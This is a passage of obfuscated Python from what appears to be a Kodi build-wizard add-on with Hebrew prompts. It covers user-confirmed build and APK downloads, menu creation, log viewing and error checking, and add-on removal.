			OO0O0OO0000OOOO00 .write (OO00O0O0O0000O000 .replace ('<setting id="show.cdart" type="bool%s/setting>'%OOOOOO0OO0OO0OO0O ,'<setting id="show.cdart" type="bool">false</setting>'))#line:4291
			OO0O0OO0000OOOO00 .close ()#line:4292
			O0O000OO0OOOOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4296
			OO0O0OO0000OOOO00 =open (O0O000OO0OOOOOO0O ,'r')#line:4298
			OO00O0O0O0000O000 =OO0O0OO0000OOOO00 .read ()#line:4299
			OO0O0OO0000OOOO00 .close ()#line:4300
			OOO0O000OO0O00000 ='<setting id="furniture.showhublogo" type="bool(.+?)/setting>'#line:4301
			OOOOOO0OO0OO0OO0O =re .compile (OOO0O000OO0O00000 ).findall (OO00O0O0O0000O000 )[0 ]#line:4302
			OO0O0OO0000OOOO00 =open (O0O000OO0OOOOOO0O ,'w')#line:4303
			OO0O0OO0000OOOO00 .write (OO00O0O0O0000O000 .replace ('<setting id="furniture.showhublogo" type="bool%s/setting>'%OOOOOO0OO0OO0OO0O ,'<setting id="furniture.showhublogo" type="bool">false</setting>'))#line:4304
			OO0O0OO0000OOOO00 .close ()#line:4305
		except :#line:4310
			pass #line:4311
def thirdPartyInstall (O00O00000OO0O0OOO ,OO000O0O0O00O0OOO ):#line:4313
	if not wiz .workingURL (OO000O0O0O00O0OOO ):#line:4314
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:4315
	OOO0O0000OO0O0O0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00O00000OO0O0OOO ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:4316
	if OOO0O0000OO0O0O0O ==1 :#line:4317
		freshStart ('third',True )#line:4318
	wiz .clearS ('build')#line:4319
	OOOO0OO0OOOO0000O =O00O00000OO0O0OOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4320
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4321
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00O00000OO0O0OOO ),'','אנא המתן')#line:4322
	O000OO0O0OO00OOOO =os .path .join (PACKAGES ,'%s.zip'%OOOO0OO0OOOO0000O )#line:4323
	try :os .remove (O000OO0O0OO00OOOO )#line:4324
	except :pass #line:4325
	downloader .download (OO000O0O0O00O0OOO ,O000OO0O0OO00OOOO ,DP )#line:4326
	xbmc .sleep (1000 )#line:4327
	OO00O0O00000OO00O ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00O00000OO0O0OOO )#line:4328
	DP .update (0 ,OO00O0O00000OO00O ,'','אנא המתן')#line:4329
	OOO00O00OO0O0O000 ,O000OOO000OOOOOOO ,OO0O00O0OOO00000O =extract .all (O000OO0O0OO00OOOO ,HOME ,DP ,title =OO00O0O00000OO00O )#line:4330
	if int (float (OOO00O00OO0O0O000 ))>0 :#line:4331
		wiz .fixmetas ()#line:4332
		wiz .lookandFeelData ('save')#line:4333
		wiz .defaultSkin ()#line:4334
		wiz .setS ('installed','true')#line:4336
		wiz .setS ('extract',str (OOO00O00OO0O0O000 ))#line:4337
		wiz .setS ('errors',str (O000OOO000OOOOOOO ))#line:4338
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OOO00O00OO0O0O000 ,O000OOO000OOOOOOO ))#line:4339
		try :os .remove (O000OO0O0OO00OOOO )#line:4340
		except :pass #line:4341
		if int (float (O000OOO000OOOOOOO ))>0 :#line:4342
			O00OOOOOOOOO0OOO0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00O00000OO0O0OOO ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,OOO00O00OO0O0O000 ,'%',COLOR1 ,O000OOO000OOOOOOO ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4343
			if O00OOOOOOOOO0OOO0 :#line:4344
				if isinstance (O000OOO000OOOOOOO ,unicode ):#line:4345
					OO0O00O0OOO00000O =OO0O00O0OOO00000O .encode ('utf-8')#line:4346
				wiz .TextBox (ADDONTITLE ,OO0O00O0OOO00000O )#line:4347
	DP .close ()#line:4348
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4349
	if INSTALLMETHOD ==1 :O0OOO0000OOO00O00 =1 #line:4350
	elif INSTALLMETHOD ==2 :O0OOO0000OOO00O00 =0 #line:4351
	else :O0OOO0000OOO00O00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:4352
	if O0OOO0000OOO00O00 ==1 :wiz .reloadFix ()#line:4353
	else :wiz .killxbmc (True )#line:4354
def testTheme (O0000OO0OOO0O0O00 ):#line:4356
	OOOOO000O00OO0O00 =zipfile .ZipFile (O0000OO0OOO0O0O00 )#line:4357
	for O0000O0OO00OOO0OO in OOOOO000O00OO0O00 .infolist ():#line:4358
		if '/settings.xml'in O0000O0OO00OOO0OO .filename :#line:4359
			return True #line:4360
	return False #line:4361
def testGui (O0OOO0000OOO00O0O ):#line:4363
	O000O00O00000O000 =zipfile .ZipFile (O0OOO0000OOO00O0O )#line:4364
	for OOO0OOOOOO0O000O0 in O000O00O00000O000 .infolist ():#line:4365
		if '/guisettings.xml'in OOO0OOOOOO0O000O0 .filename :#line:4366
			return True #line:4367
	return False #line:4368
def apkInstaller (OOO0O000OO00000OO ,OOOO000OO0O0OO00O ):#line:4370
	wiz .log (OOO0O000OO00000OO )#line:4371
	wiz .log (OOOO000OO0O0OO00O )#line:4372
	if wiz .platform ()=='android':#line:4373
		O0O0000O00000O0O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0O000OO00000OO ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4374
		if not O0O0000O00000O0O0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4375
		OO0000O000000O000 =OOO0O000OO00000OO #line:4376
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4377
		if not wiz .workingURL (OOOO000OO0O0OO00O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4378
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0000O000000O000 ),'','אנא המתן')#line:4379
		O0O000000OO0O0O0O =os .path .join (PACKAGES ,"%s.apk"%OOO0O000OO00000OO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4380
		try :os .remove (O0O000000OO0O0O0O )#line:4381
		except :pass #line:4382
		downloader .download (OOOO000OO0O0OO00O ,O0O000000OO0O0O0O ,DP )#line:4383
		xbmc .sleep (100 )#line:4384
		DP .close ()#line:4385
		notify .apkInstaller (OOO0O000OO00000OO )#line:4386
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+O0O000000OO0O0O0O +'")')#line:4387
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4388
def createMenu (O000O0OO0OOO00OOO ,O0O0OO0OO0O0OO0OO ,OO000OOOOO000OOOO ):#line:4394
	if O000O0OO0OOO00OOO =='saveaddon':#line:4395
		OOO00O0OO0OO0OOOO =[]#line:4396
		O00O000OOO0OOO000 =urllib .quote_plus (O0O0OO0OO0O0OO0OO .lower ().replace (' ',''))#line:4397
		O0OOO0OOOO0OO00OO =O0O0OO0OO0O0OO0OO .replace ('Debrid','Real Debrid')#line:4398
		OO00O00O00OO0O000 =urllib .quote_plus (OO000OOOOO000OOOO .lower ().replace (' ',''))#line:4399
		OO000OOOOO000OOOO =OO000OOOOO000OOOO .replace ('url','URL Resolver')#line:4400
		OOO00O0OO0OO0OOOO .append ((THEME2 %OO000OOOOO000OOOO .title (),' '))#line:4401
		OOO00O0OO0OO0OOOO .append ((THEME3 %'Save %s Data'%O0OOO0OOOO0OO00OO ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O00O000OOO0OOO000 ,OO00O00O00OO0O000 )))#line:4402
		OOO00O0OO0OO0OOOO .append ((THEME3 %'Restore %s Data'%O0OOO0OOOO0OO00OO ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O00O000OOO0OOO000 ,OO00O00O00OO0O000 )))#line:4403
		OOO00O0OO0OO0OOOO .append ((THEME3 %'Clear %s Data'%O0OOO0OOOO0OO00OO ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,O00O000OOO0OOO000 ,OO00O00O00OO0O000 )))#line:4404
	elif O000O0OO0OOO00OOO =='save':#line:4405
		OOO00O0OO0OO0OOOO =[]#line:4406
		O00O000OOO0OOO000 =urllib .quote_plus (O0O0OO0OO0O0OO0OO .lower ().replace (' ',''))#line:4407
		O0OOO0OOOO0OO00OO =O0O0OO0OO0O0OO0OO .replace ('Debrid','Real Debrid')#line:4408
		OO00O00O00OO0O000 =urllib .quote_plus (OO000OOOOO000OOOO .lower ().replace (' ',''))#line:4409
		OO000OOOOO000OOOO =OO000OOOOO000OOOO .replace ('url','URL Resolver')#line:4410
		OOO00O0OO0OO0OOOO .append ((THEME2 %OO000OOOOO000OOOO .title (),' '))#line:4411
		OOO00O0OO0OO0OOOO .append ((THEME3 %'Register %s'%O0OOO0OOOO0OO00OO ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,O00O000OOO0OOO000 ,OO00O00O00OO0O000 )))#line:4412
		OOO00O0OO0OO0OOOO .append ((THEME3 %'Save %s Data'%O0OOO0OOOO0OO00OO ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O00O000OOO0OOO000 ,OO00O00O00OO0O000 )))#line:4413
		OOO00O0OO0OO0OOOO .append ((THEME3 %'Restore %s Data'%O0OOO0OOOO0OO00OO ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O00O000OOO0OOO000 ,OO00O00O00OO0O000 )))#line:4414
		OOO00O0OO0OO0OOOO .append ((THEME3 %'Import %s Data'%O0OOO0OOOO0OO00OO ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,O00O000OOO0OOO000 ,OO00O00O00OO0O000 )))#line:4415
		OOO00O0OO0OO0OOOO .append ((THEME3 %'Clear Addon %s Data'%O0OOO0OOOO0OO00OO ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,O00O000OOO0OOO000 ,OO00O00O00OO0O000 )))#line:4416
	elif O000O0OO0OOO00OOO =='install':#line:4417
		OOO00O0OO0OO0OOOO =[]#line:4418
		OO00O00O00OO0O000 =urllib .quote_plus (OO000OOOOO000OOOO )#line:4419
		OOO00O0OO0OO0OOOO .append ((THEME2 %OO000OOOOO000OOOO ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,OO00O00O00OO0O000 )))#line:4420
		OOO00O0OO0OO0OOOO .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,OO00O00O00OO0O000 )))#line:4421
		OOO00O0OO0OO0OOOO .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,OO00O00O00OO0O000 )))#line:4422
		OOO00O0OO0OO0OOOO .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,OO00O00O00OO0O000 )))#line:4423
		OOO00O0OO0OO0OOOO .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,OO00O00O00OO0O000 )))#line:4424
	OOO00O0OO0OO0OOOO .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4425
	return OOO00O0OO0OO0OOOO #line:4426
def toggleCache (OO0O000O0OO0O0000 ):#line:4428
	O0O0OOOOOO00OOO00 =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4429
	O0000O0O0O0O00O00 =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4430
	if OO0O000O0OO0O0000 in ['true','false']:#line:4431
		for O0OO00OO00OO0O0O0 in O0O0OOOOOO00OOO00 :#line:4432
			wiz .setS (O0OO00OO00OO0O0O0 ,OO0O000O0OO0O0000 )#line:4433
	else :#line:4434
		if not OO0O000O0OO0O0000 in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4435
			try :#line:4436
				O0OO00OO00OO0O0O0 =O0000O0O0O0O00O00 [O0O0OOOOOO00OOO00 .index (OO0O000O0OO0O0000 )]#line:4437
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,O0OO00OO00OO0O0O0 ))#line:4438
			except :#line:4439
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,OO0O000O0OO0O0000 ))#line:4440
		else :#line:4441
			OO00O0O0O000000O0 ='true'if wiz .getS (OO0O000O0OO0O0000 )=='false'else 'false'#line:4442
			wiz .setS (OO0O000O0OO0O0000 ,OO00O0O0O000000O0 )#line:4443
def playVideo (OOO0OO000O0O0OO00 ):#line:4445
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%OOO0OO000O0O0OO00 )#line:4446
	if 'watch?v='in OOO0OO000O0O0OO00 :#line:4447
		O00O0O0O00OOO0OO0 ,O00OOOOOOOO0O0O00 =OOO0OO000O0O0OO00 .split ('?')#line:4448
		O0OO00O0O0000O00O =O00OOOOOOOO0O0O00 .split ('&')#line:4449
		for OOOOO0000OOOO00OO in O0OO00O0O0000O00O :#line:4450
			if OOOOO0000OOOO00OO .startswith ('v='):#line:4451
				OOO0OO000O0O0OO00 =OOOOO0000OOOO00OO [2 :]#line:4452
				break #line:4453
			else :continue #line:4454
	elif 'embed'in OOO0OO000O0O0OO00 or 'youtu.be'in OOO0OO000O0O0OO00 :#line:4455
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%OOO0OO000O0O0OO00 )#line:4456
		O00O0O0O00OOO0OO0 =OOO0OO000O0O0OO00 .split ('/')#line:4457
		if len (O00O0O0O00OOO0OO0 [-1 ])>5 :#line:4458
			OOO0OO000O0O0OO00 =O00O0O0O00OOO0OO0 [-1 ]#line:4459
		elif len (O00O0O0O00OOO0OO0 [-2 ])>5 :#line:4460
			OOO0OO000O0O0OO00 =O00O0O0O00OOO0OO0 [-2 ]#line:4461
	wiz .log ("YouTube URL: %s"%OOO0OO000O0O0OO00 )#line:4462
	yt .PlayVideo (OOO0OO000O0O0OO00 )#line:4463
def viewLogFile ():#line:4465
	OOOO0O00O0OOOO000 =wiz .Grab_Log (True )#line:4466
	OOO00O00OO0OO0000 =wiz .Grab_Log (True ,True )#line:4467
	OOO000O0OOO00OOO0 =0 ;OOOO0000000O00O0O =OOOO0O00O0OOOO000 #line:4468
	if not OOO00O00OO0OO0000 ==False and not OOOO0O00O0OOOO000 ==False :#line:4469
		OOO000O0OOO00OOO0 =DIALOG .select (ADDONTITLE ,["View %s"%OOOO0O00O0OOOO000 .replace (LOG ,""),"View %s"%OOO00O00OO0OO0000 .replace (LOG ,"")])#line:4470
		if OOO000O0OOO00OOO0 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4471
	elif OOOO0O00O0OOOO000 ==False and OOO00O00OO0OO0000 ==False :#line:4472
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4473
		return #line:4474
	elif not OOOO0O00O0OOOO000 ==False :OOO000O0OOO00OOO0 =0 #line:4475
	elif not OOO00O00OO0OO0000 ==False :OOO000O0OOO00OOO0 =1 #line:4476
	OOOO0000000O00O0O =OOOO0O00O0OOOO000 if OOO000O0OOO00OOO0 ==0 else OOO00O00OO0OO0000 #line:4478
	OO0000000O0O00OO0 =wiz .Grab_Log (False )if OOO000O0OOO00OOO0 ==0 else wiz .Grab_Log (False ,True )#line:4479
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,OOOO0000000O00O0O ),OO0000000O0O00OO0 )#line:4481
def errorChecking (log =None ,count =None ,all =None ):#line:4483
	if log ==None :#line:4484
		OO00O00000OO00O0O =wiz .Grab_Log (True )#line:4485
		O000000OO000O0OO0 =wiz .Grab_Log (True ,True )#line:4486
		if not O000000OO000O0OO0 ==False and not OO00O00000OO00O0O ==False :#line:4487
			O00O00OOOO00O0O0O =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(OO00O00000OO00O0O .replace (LOG ,""),errorChecking (OO00O00000OO00O0O ,True ,True )),"View %s: %s error(s)"%(O000000OO000O0OO0 .replace (LOG ,""),errorChecking (O000000OO000O0OO0 ,True ,True ))])#line:4488
			if O00O00OOOO00O0O0O ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4489
		elif OO00O00000OO00O0O ==False and O000000OO000O0OO0 ==False :#line:4490
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4491
			return #line:4492
		elif not OO00O00000OO00O0O ==False :O00O00OOOO00O0O0O =0 #line:4493
		elif not O000000OO000O0OO0 ==False :O00O00OOOO00O0O0O =1 #line:4494
		log =OO00O00000OO00O0O if O00O00OOOO00O0O0O ==0 else O000000OO000O0OO0 #line:4495
	if log ==False :#line:4496
		if count ==None :#line:4497
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4498
			return False #line:4499
		else :#line:4500
			return 0 #line:4501
	else :#line:4502
		if os .path .exists (log ):#line:4503
			O0OO0O000O000OO00 =open (log ,mode ='r');O0O00OOO0O00OO00O =O0OO0O000O000OO00 .read ().replace ('\n','').replace ('\r','');O0OO0O000O000OO00 .close ()#line:4504
			O0O0O000OOO0OO000 =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (O0O00OOO0O00OO00O )#line:4505
			if not count ==None :#line:4506
				if all ==None :#line:4507
					O0O0O00O000OO0O0O =0 #line:4508
					for OO0O0000OO0O0OOOO in O0O0O000OOO0OO000 :#line:4509
						if ADDON_ID in OO0O0000OO0O0OOOO :O0O0O00O000OO0O0O +=1 #line:4510
					return O0O0O00O000OO0O0O #line:4511
				else :return len (O0O0O000OOO0OO000 )#line:4512
			if len (O0O0O000OOO0OO000 )>0 :#line:4513
				O0O0O00O000OO0O0O =0 ;O00O000OO0OOOOO0O =""#line:4514
				for OO0O0000OO0O0OOOO in O0O0O000OOO0OO000 :#line:4515
					if all ==None and not ADDON_ID in OO0O0000OO0O0OOOO :continue #line:4516
					else :#line:4517
						O0O0O00O000OO0O0O +=1 #line:4518
						O00O000OO0OOOOO0O +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(O0O0O00O000OO0O0O ,OO0O0000OO0O0OOOO .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4519
				if O0O0O00O000OO0O0O >0 :#line:4520
					wiz .TextBox (ADDONTITLE ,O00O000OO0OOOOO0O )#line:4521
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4522
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4523
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4524
ACTION_PREVIOUS_MENU =10 #line:4526
ACTION_NAV_BACK =92 #line:4527
ACTION_MOVE_LEFT =1 #line:4528
ACTION_MOVE_RIGHT =2 #line:4529
ACTION_MOVE_UP =3 #line:4530
ACTION_MOVE_DOWN =4 #line:4531
ACTION_MOUSE_WHEEL_UP =104 #line:4532
ACTION_MOUSE_WHEEL_DOWN =105 #line:4533
ACTION_MOVE_MOUSE =107 #line:4534
ACTION_SELECT_ITEM =7 #line:4535
ACTION_BACKSPACE =110 #line:4536
ACTION_MOUSE_LEFT_CLICK =100 #line:4537
ACTION_MOUSE_LONG_CLICK =108 #line:4538
def LogViewer (default =None ):#line:4540
	class O0OOO00OOOO0OOO0O (xbmcgui .WindowXMLDialog ):#line:4541
		def __init__ (OOOO00OOOOO0O00O0 ,*OO0O0OO000O0O00O0 ,**OO00O0OOOOOOO000O ):#line:4542
			OOOO00OOOOO0O00O0 .default =OO00O0OOOOOOO000O ['default']#line:4543
		def onInit (OOOO0000OO0OO0O00 ):#line:4545
			OOOO0000OO0OO0O00 .title =101 #line:4546
			OOOO0000OO0OO0O00 .msg =102 #line:4547
			OOOO0000OO0OO0O00 .scrollbar =103 #line:4548
			OOOO0000OO0OO0O00 .upload =201 #line:4549
			OOOO0000OO0OO0O00 .kodi =202 #line:4550
			OOOO0000OO0OO0O00 .kodiold =203 #line:4551
			OOOO0000OO0OO0O00 .wizard =204 #line:4552
			OOOO0000OO0OO0O00 .okbutton =205 #line:4553
			O00000OOOOO0O00O0 =open (OOOO0000OO0OO0O00 .default ,'r')#line:4554
			OOOO0000OO0OO0O00 .logmsg =O00000OOOOO0O00O0 .read ()#line:4555
			O00000OOOOO0O00O0 .close ()#line:4556
			OOOO0000OO0OO0O00 .titlemsg ="%s: %s"%(ADDONTITLE ,OOOO0000OO0OO0O00 .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4557
			OOOO0000OO0OO0O00 .showdialog ()#line:4558
		def showdialog (O0O0O0O0O0000O000 ):#line:4560
			O0O0O0O0O0000O000 .getControl (O0O0O0O0O0000O000 .title ).setLabel (O0O0O0O0O0000O000 .titlemsg )#line:4561
			O0O0O0O0O0000O000 .getControl (O0O0O0O0O0000O000 .msg ).setText (wiz .highlightText (O0O0O0O0O0000O000 .logmsg ))#line:4562
			O0O0O0O0O0000O000 .setFocusId (O0O0O0O0O0000O000 .scrollbar )#line:4563
		def onClick (OOOOO0O00000OOO0O ,OOOOO000O0OOO0O0O ):#line:4565
			if OOOOO000O0OOO0O0O ==OOOOO0O00000OOO0O .okbutton :OOOOO0O00000OOO0O .close ()#line:4566
			elif OOOOO000O0OOO0O0O ==OOOOO0O00000OOO0O .upload :OOOOO0O00000OOO0O .close ();uploadLog .Main ()#line:4567
			elif OOOOO000O0OOO0O0O ==OOOOO0O00000OOO0O .kodi :#line:4568
				OOOO00O0000O00OOO =wiz .Grab_Log (False )#line:4569
				OO0O0OO000O00OO00 =wiz .Grab_Log (True )#line:4570
				if OOOO00O0000O00OOO ==False :#line:4571
					OOOOO0O00000OOO0O .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4572
					OOOOO0O00000OOO0O .getControl (OOOOO0O00000OOO0O .msg ).setText ("Log File Does Not Exists!")#line:4573
				else :#line:4574
					OOOOO0O00000OOO0O .titlemsg ="%s: %s"%(ADDONTITLE ,OO0O0OO000O00OO00 .replace (LOG ,''))#line:4575
					OOOOO0O00000OOO0O .getControl (OOOOO0O00000OOO0O .title ).setLabel (OOOOO0O00000OOO0O .titlemsg )#line:4576
					OOOOO0O00000OOO0O .getControl (OOOOO0O00000OOO0O .msg ).setText (wiz .highlightText (OOOO00O0000O00OOO ))#line:4577
					OOOOO0O00000OOO0O .setFocusId (OOOOO0O00000OOO0O .scrollbar )#line:4578
			elif OOOOO000O0OOO0O0O ==OOOOO0O00000OOO0O .kodiold :#line:4579
				OOOO00O0000O00OOO =wiz .Grab_Log (False ,True )#line:4580
				OO0O0OO000O00OO00 =wiz .Grab_Log (True ,True )#line:4581
				if OOOO00O0000O00OOO ==False :#line:4582
					OOOOO0O00000OOO0O .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4583
					OOOOO0O00000OOO0O .getControl (OOOOO0O00000OOO0O .msg ).setText ("Log File Does Not Exists!")#line:4584
				else :#line:4585
					OOOOO0O00000OOO0O .titlemsg ="%s: %s"%(ADDONTITLE ,OO0O0OO000O00OO00 .replace (LOG ,''))#line:4586
					OOOOO0O00000OOO0O .getControl (OOOOO0O00000OOO0O .title ).setLabel (OOOOO0O00000OOO0O .titlemsg )#line:4587
					OOOOO0O00000OOO0O .getControl (OOOOO0O00000OOO0O .msg ).setText (wiz .highlightText (OOOO00O0000O00OOO ))#line:4588
					OOOOO0O00000OOO0O .setFocusId (OOOOO0O00000OOO0O .scrollbar )#line:4589
			elif OOOOO000O0OOO0O0O ==OOOOO0O00000OOO0O .wizard :#line:4590
				OOOO00O0000O00OOO =wiz .Grab_Log (False ,False ,True )#line:4591
				OO0O0OO000O00OO00 =wiz .Grab_Log (True ,False ,True )#line:4592
				if OOOO00O0000O00OOO ==False :#line:4593
					OOOOO0O00000OOO0O .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4594
					OOOOO0O00000OOO0O .getControl (OOOOO0O00000OOO0O .msg ).setText ("Log File Does Not Exists!")#line:4595
				else :#line:4596
					OOOOO0O00000OOO0O .titlemsg ="%s: %s"%(ADDONTITLE ,OO0O0OO000O00OO00 .replace (ADDONDATA ,''))#line:4597
					OOOOO0O00000OOO0O .getControl (OOOOO0O00000OOO0O .title ).setLabel (OOOOO0O00000OOO0O .titlemsg )#line:4598
					OOOOO0O00000OOO0O .getControl (OOOOO0O00000OOO0O .msg ).setText (wiz .highlightText (OOOO00O0000O00OOO ))#line:4599
					OOOOO0O00000OOO0O .setFocusId (OOOOO0O00000OOO0O .scrollbar )#line:4600
		def onAction (O000OO0OO000O0O00 ,OO0OO0000OOOO0O00 ):#line:4602
			if OO0OO0000OOOO0O00 ==ACTION_PREVIOUS_MENU :O000OO0OO000O0O00 .close ()#line:4603
			elif OO0OO0000OOOO0O00 ==ACTION_NAV_BACK :O000OO0OO000O0O00 .close ()#line:4604
	if default ==None :default =wiz .Grab_Log (True )#line:4605
	OOO000O000OOO0OOO =O0OOO00OOOO0OOO0O ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:4606
	OOO000O000OOO0OOO .doModal ()#line:4607
	del OOO000O000OOO0OOO #line:4608
def removeAddon (O000OO000OOO00000 ,O00O0OOOOOO0OOOO0 ,over =False ):#line:4610
	if not over ==False :#line:4611
		OOO0OO0OOOOOO0000 =1 #line:4612
	else :#line:4613
		OOO0OO0OOOOOO0000 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O00O0OOOOOO0OOOO0 ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,O000OO000OOO00000 ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:4614
	if OOO0OO0OOOOOO0000 ==1 :#line:4615
		O0000O0O0O0OO0O0O =os .path .join (ADDONS ,O000OO000OOO00000 )#line:4616
		wiz .log ("Removing Addon %s"%O000OO000OOO00000 )#line:4617
		wiz .cleanHouse (O0000O0O0O0OO0O0O )#line:4618
		xbmc .sleep (1000 )#line:4619
		try :shutil .rmtree (O0000O0O0O0OO0O0O )#line:4620
		except Exception as OOO0O00O00O00O0O0 :wiz .log ("Error removing %s"%O000OO000OOO00000 ,xbmc .LOGNOTICE )#line:4621
		removeAddonData (O000OO000OOO00000 ,O00O0OOOOOO0OOOO0 ,over )#line:4622
	if over ==False :#line:4623
